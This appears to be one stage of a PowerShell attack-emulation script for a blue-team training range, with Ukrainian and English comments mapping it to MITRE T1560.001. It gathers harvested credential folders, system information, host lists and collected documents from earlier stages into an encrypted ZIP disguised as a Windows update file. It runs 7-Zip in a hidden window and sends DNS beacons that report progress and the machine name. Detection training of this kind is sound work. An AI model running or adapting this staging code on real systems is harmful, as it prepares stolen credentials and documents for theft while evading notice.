# =============================================================================
# Block 4: Archive Staging
# для навчання — заборонено використовувати поза навчальним середовищем
# EXERCISE ONLY — CyberRanges blue team training
# =============================================================================
# Що робить:
#   Збирає всі артефакти блоків 2 і 3 в один зашифрований ZIP архів
#   та зберігає у %TEMP% під виглядом системного файлу.
#
# Артефакти для blue team:
#   - Sysmon EID 11 : новий .zip файл у %TEMP%
#   - Sysmon EID 1  : якщо використовується 7z.exe
#   - Wazuh FIM     : зміна у %TEMP%
#
# MITRE ATT&CK:
#   T1560.001 — Archive Collected Data: Archive via Utility
# =============================================================================

param(
    [string]$Password = "Upd@te2024!"
)

$BLOCK_TAG = "B4"
$LogPath   = "C:\ProgramData\upd_logs\block4.log"
. "$PSScriptRoot\config.ps1"

# =============================================================================

Write-Log "=== BLOCK 4: ARCHIVE STAGING START ==="
Invoke-DnsBeacon -Label "B4:START:$env:COMPUTERNAME"

$STAGE_NAME  = "WinUpd_$(Get-Random -Maximum 99999).zip"
$STAGE_PATH  = "C:\ProgramData\$STAGE_NAME"

# ── Зібрати файли для архівування ────────────────────────────────────────────

$files_to_stage = @()

# З block2
$sysinfo = "$LOG_DIR\sysinfo.txt"
$creds   = "$LOG_DIR\creds"
if (Test-Path $sysinfo) { $files_to_stage += $sysinfo;  Write-Log "Staging: sysinfo.txt" }
if (Test-Path $creds)   { $files_to_stage += $creds;    Write-Log "Staging: creds\ folder" }

# З block3
$hosts = "$LOG_DIR\hosts.txt"
if (Test-Path $hosts)   { $files_to_stage += $hosts;    Write-Log "Staging: hosts.txt" }

# З A07/A08 — зібрані документи з WS-1, WS-2, FILES-01
$docs = "$LOG_DIR\docs"
if (Test-Path $docs)    { $files_to_stage += $docs;     Write-Log "Staging: docs\ folder" }

if ($files_to_stage.Count -eq 0) {
    Write-Log "Немає файлів для архівування" -Level "WARN"
    Invoke-DnsBeacon -Label "B4:ERROR:NO_FILES"
    exit
}

Write-Log "Файлів для архівування: $($files_to_stage.Count)"

# ── Спроба 1: 7-Zip (якщо встановлено) ───────────────────────────────────────

$7zip_paths = @(
    "C:\Program Files\7-Zip\7z.exe",
    "C:\Program Files (x86)\7-Zip\7z.exe"
)
$7zip = $7zip_paths | Where-Object { Test-Path $_ } | Select-Object -First 1

if ($7zip) {
    Write-Log "Використовуємо 7-Zip: $7zip"
    $items = $files_to_stage -join '" "'
    $args  = "a -tzip -p$Password -mhe=on `"$STAGE_PATH`" `"$items`""
    Start-Process -FilePath $7zip -ArgumentList $args -Wait -WindowStyle Hidden
    Write-Log "7-Zip archive created: $STAGE_PATH"

} else {
    # ── Спроба 2: PowerShell Compress-Archive (без пароля — fallback) ────────
    Write-Log "7-Zip не знайдено — використовуємо Compress-Archive (без пароля)" -Level "WARN"

    # Збираємо файли в тимчасову staging папку (бо Compress-Archive не приймає папку + файли разом)
    $stage_tmp = "C:\ProgramData\stage_tmp_$(Get-Random)"
    New-Item -Path $stage_tmp -ItemType Directory -Force | Out-Null

    foreach ($item in $files_to_stage) {
        Copy-Item -Path $item -Destination $stage_tmp -Recurse -Force
    }

    Compress-Archive -Path "$stage_tmp\*" -DestinationPath $STAGE_PATH -Force
    Remove-Item $stage_tmp -Recurse -Force -EA SilentlyContinue

    Write-Log "ZIP archive created: $STAGE_PATH"
}

# ── Перевірка результату ──────────────────────────────────────────────────────

if (Test-Path $STAGE_PATH) {
    $size = (Get-Item $STAGE_PATH).Length
    Write-Log "Archive ready: $STAGE_PATH ($size bytes)"
    Invoke-DnsBeacon -Label "B4:ARCHIVE:OK:${size}B"

    # Зберігаємо шлях до архіву для block5
    "$STAGE_PATH" | Out-File -FilePath "$LOG_DIR\stage_path.txt" -Encoding UTF8

    Write-Log "=== BLOCK 4: COMPLETE ==="
    Invoke-DnsBeacon -Label "B4:DONE:$env:COMPUTERNAME"
    return $STAGE_PATH
} else {
    Write-Log "Архів не створено!" -Level "ERROR"
    Invoke-DnsBeacon -Label "B4:ERROR:ARCHIVE_FAILED"
    exit
}
